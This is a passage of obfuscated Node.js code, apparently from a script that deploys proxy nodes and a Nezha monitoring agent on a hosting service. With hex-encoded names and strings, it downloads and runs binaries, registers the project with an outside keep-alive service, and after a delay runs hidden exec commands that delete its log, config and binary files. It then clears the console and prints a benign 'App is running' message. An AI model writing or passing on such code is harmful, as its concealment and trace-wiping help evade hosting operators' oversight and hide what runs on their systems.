_0x55b6a4=_0x5bd1,_0x3d4a88=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x3d4a88[_0x55b6a4(0x261)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x3d4a88[_0x55b6a4(0x261)](phpPath);process[_0x55b6a4(0x220)]==='win32'?exec(_0x55b6a4(0x21d)+_0x3d4a88[_0x55b6a4(0x1f3)]('\x20')+_0x55b6a4(0x1d6),_0x23dfb5=>{const _0x5c8d64=_0x55b6a4;console[_0x5c8d64(0x229)](),console[_0x5c8d64(0x236)](_0x5c8d64(0x1fd)),console['log'](_0x5c8d64(0x1df));}):exec(_0x55b6a4(0x241)+_0x3d4a88['join']('\x20')+_0x55b6a4(0x237),_0x408d84=>{const _0x470d12=_0x55b6a4;console[_0x470d12(0x229)](),console[_0x470d12(0x236)]('App\x20is\x20running'),console[_0x470d12(0x236)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x4fee50=_0x122416;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x4fee50(0x236)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x58cd76=await axios[_0x4fee50(0x1d5)](_0x4fee50(0x286),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x4fee50(0x236)](_0x4fee50(0x297)),_0x58cd76;}catch(_0x5a02a0){return console[_0x4fee50(0x255)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x5a02a0[_0x4fee50(0x2a0)]),null;}}async function startserver(){const _0xdbe55c=_0x122416;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x11ab02){console['error'](_0xdbe55c(0x29f),_0x11ab02);}}startserver()[_0x122416(0x21b)](_0x228cac=>{const _0x5b797a=_0x122416;console[_0x5b797a(0x255)](_0x5b797a(0x29d),_0x228cac);}),app[_0x122416(0x23c)](PORT,()=>console['log'](_0x122416(0x20d)+PORT+'!'));
